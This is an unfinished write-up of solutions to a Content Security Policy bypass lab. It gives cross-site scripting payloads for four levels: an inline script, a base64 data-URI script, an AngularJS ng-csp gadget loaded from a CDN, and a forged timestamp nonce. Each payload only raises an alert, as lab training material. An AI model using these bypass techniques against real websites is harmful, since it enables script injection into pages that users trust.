# CSP Bypass Lab

Note: WIP

**+++ Level 1 +++**
```html
<script>alert(document.domain)</script>
```

**+++ Level 2 +++**
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

**+++ Level 3 +++**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
 {{$on.curry.call().alert(1)}}
</div>
```

**+++ Level 4 +++**
Decode (base64) the nonce. Change the time to now. Encode (base64) the changed timestamp. Use the encoded timestamp as nonce value.
```html
<script nonce="MzEuMDEuMjAyMy8xNjozMw==">alert(document.domain)</script>
```

**+++ Level 5 +++**
```html
tbc
```
